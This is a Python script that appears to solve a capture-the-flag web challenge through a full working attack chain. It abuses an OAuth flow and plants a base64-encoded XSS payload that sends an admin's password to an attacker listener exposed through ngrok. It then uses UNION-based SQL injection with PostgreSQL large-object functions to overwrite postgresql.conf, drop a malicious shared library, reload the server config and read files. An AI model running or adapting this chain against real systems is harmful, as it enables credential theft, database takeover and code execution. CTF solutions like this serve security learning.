import requests
import base64
import time
import subprocess
import sys
import argparse
import json
import threading

import re
from urllib.parse import urlparse, parse_qs

from flask import Flask, request, Response

app = Flask(__name__)

class AttackTo:
    def __init__(self, session, base_url, user, password):
        self.base_url = base_url.rstrip("/")
        self.session = session
        self.user = user
        self.password = password
        self.auth_code = None
        self.sid = None

    def perform_login(self):
        try:
            self._create_user()
        except:
            pass

        self._submit_credentials()
        oauth_client_id = self._get_oauth_client_id()
        self.auth_code = self._authorize(oauth_client_id)
        self.sid = self._exchange_code()
        return self.auth_code, self.sid
    
    def admin_login(self):
        data = {
            "username":self.user,
            "password":self.password
        }

        response = self.session.post(url=self.base_url+"/api/login",json=data)
        response.raise_for_status()

    def send_table(self, command):
        data = {
            "tableName":command
        }

        response = self.session.post(url=self.base_url+"/table",json=data,
            proxies={"http":"http://localhost:8080"})
        response.raise_for_status()
        return response.text

    def send_submissions(self, payload, callback):
        data = {
            "name":"Go",
            "description":payload,
            "url":callback,
            "category":"lore"
        }

        response = self.session.post(url=self.base_url+f"/api/submissions",json=data, allow_redirects=False)
        response.raise_for_status()

    def _create_user(self):
        data = {
            "username":self.user,
            "password":self.password
        }

        response = self.session.post(url=self.base_url+"/oauth/register",json=data)
        response.raise_for_status()

    def _submit_credentials(self):
        data = {
            "username": self.user,
            "password": self.password
        }
        response = self.session.post(f"{self.base_url}/oauth/login", json=data)
        response.raise_for_status()

    def _get_oauth_client_id(self):
        response = self.session.get(f"{self.base_url}/api/config")
        response.raise_for_status()
        return response.json()["oauthClientId"]

    def _authorize(self, client_id):
        data = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": "/callback",
            "scope": "read",
            "state": "",
            "approve": "true"
        }
        response = self.session.post(
            f"{self.base_url}/oauth/authorize",
            data=data,
            allow_redirects=False
        )
        response.raise_for_status()

        location = response.headers.get("Location")
        parsed_url = urlparse(location)
        query_params = parse_qs(parsed_url.query)
        return query_params.get("code", [None])[0]

    def _exchange_code(self):
        data = {"code": self.auth_code}
        response = self.session.post(
            f"{self.base_url}/api/oauthLogin",
            data=data
        )
        response.raise_for_status()

        set_cookie = response.headers.get("Set-Cookie")
        match = re.search(r'connect\.sid=([^;]+)', set_cookie)
        return match.group(1) if match else None

@app.route('/')
def recevie():
    global ALREADY_GET_PASSWORD
    if ALREADY_GET_PASSWORD:
        return Response(status=204)
    
    print('Recevie Payload')
    encoded_data = request.args.get('data')
    if not encoded_data:
        return Response(status=204) 

    try:
        decoded_bytes = base64.b64decode(encoded_data, validate=True)
        decoded_str = decoded_bytes.decode("utf-8")
    except Exception as e:
        return Response(status=204) 

    if "admin" not in decoded_str:
        print(decoded_str)
        return Response(status=204) 

    try:
        data = json.loads(decoded_str)
        results = data.get("results", [])
        for user in results:
            if user.get("username") == "admin":
                ALREADY_GET_PASSWORD= True                
                wait_to_execute(runPhase2, 10, password=user.get("password"))
    except Exception as e:
        pass
    
    return Response(status=204) 

def start_ngrok(port):
    global NGROK_PROCESS, NGROK_PUBLIC_URL
    NGROK_PROCESS = subprocess.Popen(['ngrok', 'http', str(port)], stdout=subprocess.DEVNULL)
    print("[*] Starting ngrok...")

    time.sleep(2)
    try:
        tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()['tunnels']
        NGROK_PUBLIC_URL = tunnels[0]['public_url']
        print(f"[*] Ngrok tunnel started at: {NGROK_PUBLIC_URL}")
    except Exception as e:
        print("[!] Failed to retrieve ngrok URL:", e)
        sys.exit(1)

def validate_args():
    global TARGET, JUMP_PHASE_ONE
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', help='Url challenge', default="http://localhost:1337")
    parser.add_argument('--just_phase_two', action='store_true', default=False)

    args = parser.parse_args()
    TARGET = args.target
    JUMP_PHASE_ONE = args.just_phase_two

def wait_to_execute(func, delay, *args, **kwargs):
    def wrapper():
        time.sleep(delay)
        func(*args, **kwargs)

    thread = threading.Thread(target=wrapper)
    thread.start()
    return thread
    
def get_payload(connectsid):
    with open('self-xss.js','r') as f:
        javascript = f.read().replace('__SESSION__', connectsid)
    
    javascript = javascript.replace('__ATTACKER_SERVER__', NGROK_PUBLIC_URL)
    payload = f"'><img src=x onerror=eval(atob('{base64.b64encode(javascript.encode()).decode()}')) />"
    return payload

def get_shell():
    with open('payload.so','rb') as f:
        payload = base64.b64encode(f.read()).decode()
    return payload

def get_config():
    with open('postgresql.conf','rb') as f:
        payload = base64.b64encode(f.read()).decode()
    return payload

def runPhase1():
    with requests.Session() as session:
        user = AttackTo(session, TARGET, 'a', '123qwe')
        code, sid = user.perform_login()

        wait_time = 30

        payload = get_payload(sid)

        if not JUMP_PHASE_ONE:
            print('Send To Callback')
            user.send_submissions(payload, f"http://127.0.0.1:1337/callback?code={code}")
            time.sleep(wait_time)

        print('Send My Submissions and Logout')
        user.send_submissions('Any', f"http://127.0.0.1:1337/my-submissions")

        while True:
            time.sleep(wait_time)

            if ALREADY_GET_PASSWORD:
                break

            print('Send Self XSS')
            user.send_submissions('Any', f"http://127.0.0.1:1337/my-submissions")

def runPhase2(password):
    with requests.Session() as session:
        user = AttackTo(session, TARGET, 'admin', password)
        user.admin_login()

        import random
        id_config = random.randint(10000, 99999)
        id_payload = random.randint(10000, 99999)


        user.send_table(f"users\" UNION SELECT 0, null, lo_from_bytea({id_config}, decode('{get_config()}', 'base64'))::text --")
        user.send_table(f"users\" UNION SELECT 0, null, lo_export({id_config}, '/var/lib/postgresql/data/postgresql.conf')::text --")
        user.send_table(f"users\" UNION SELECT 0, null, lo_from_bytea({id_payload}, decode('{get_shell()}', 'base64'))::text --")
        user.send_table(f"users\" UNION SELECT 0, null, lo_export({id_payload}, '/tmp/payload.so')::text --")
        user.send_table(f"users\" UNION SELECT 0, null, pg_reload_conf()::text --")
        
        time.sleep(10)
        user.send_table(f"users\" UNION SELECT 0, null, null --")
        response = user.send_table(f"users\" UNION SELECT 0, null, pg_read_file('/tmp/flag') --")
        print(response)

PORT = 5000

NGROK_PROCESS = None
NGROK_PUBLIC_URL = None

ALREADY_GET_PASSWORD = False
JUMP_PHASE_ONE = False

TARGET = ""

if __name__ == '__main__':
    target = validate_args()
    try:
        start_ngrok(PORT)
        
        session = requests.Session()
        wait_to_execute(runPhase1, 10)
        print('[*] Flask server running. Waiting for the bot...')
        app.run(host='0.0.0.0', port=PORT)
    except Exception:
        print('[*] Shutting down ngrok...')
        if NGROK_PROCESS:
            NGROK_PROCESS.terminate()